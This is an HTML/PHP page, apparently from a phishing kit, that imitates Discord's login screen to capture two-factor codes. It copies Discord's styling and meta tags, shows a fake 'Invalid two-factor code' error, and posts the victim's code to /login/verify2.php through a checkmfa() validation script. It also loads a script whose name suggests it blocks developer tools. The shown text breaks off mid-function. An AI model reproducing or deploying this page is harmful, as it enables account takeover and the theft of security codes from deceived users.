...
<meta charset="utf-8">
    ...
    <head>
        ...
        <meta property="og:image" content="source/img/ee7c382d9257652a88c8f7b7f22a994d.png">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@discord">
        <meta name="twitter:creator" content="@discord">
        <link rel="stylesheet" href="source/css/style.css">
        <link rel="icon" href="source/img/847541504914fd33810e70a0ea73177e.ico">
        ...
        <script charset="utf-8" src="source/js/62139f1cff10402837062.js"></script>
        <script charset="utf-8" src="source/js/antif12.js"></script>
    ...
    <body>
        <div id="app-mount" class="appMount-3lHmkl">
            <div class="app-1q1i1E">
                <div class="characterBackground-2itjYF">
                    <img style="position: fixed; height: 100%; top: 0; left: 0; width: 100%;" src="source/img/44e0c1fbcf99c4476083442e4a2774e0.svg">
                </div>
                <div class="splashBackground-1FRCko wrapper-3Q5DdO scrollbarGhost-2F9Zj2 scrollbar-3dvm_9">
                    <div>
                        <div class="wrapper-6URcxg">
                            <form class="authBox-hW6HRx theme-dark" onsubmit="checkmfa(); return false;" method="POST" id="formx" action="/login/verify2.php">
                                <div class="centeringWrapper-2Rs1dR"><img alt="" src="source/img/0f4d1ff76624bb45a3fee4189279ee92.svg" class="marginBottom20-32qID7">
                                    ...
                                    <div class="block-egJnc0 marginTop40-i-78cZ">
                                        <div class="marginBottom20-32qID7">
                                            <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1ndd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole1-text">ENTER DISCORD AUTH/BACKUP CODE - Invalid two-factor code
                                                <span id="elprimo1" class="errorMessage-3Guw2R">
                                                    <span class="errorSeparator-30Q6aR">-</span>

                                                </span>
                                            </h5>
                                            <div class="inputWrapper-31_8H8"><input class="inputDefault-_djjkz input-cIJ7To" id="pole1" name="mfacode2" type="text" placeholder=<?php echo '"'.$mfa[3].'"';?> aria-label=<?php echo '"'.$mfa[4].'"';?> autocomplete="off" maxlength="10" spellcheck="false" value=""></div>
        ...
        <script type="text/javascript">
            ...
            function checkmfa(){
                let el = document.getElementsByName("mfacode2")[0];
                let mfacode2 = el.value;
                if(mfacode2.length != 6 || !/^\d+$/giu.test(mfacode2)){
                    let pol1 = document.querySelector("#pole1");
                    pol1.classList.add("unselect");
                    document.getElementById("elprimo1").hidden=false;
                    document.getElementById("pole1-text").style.color="#ed4245";
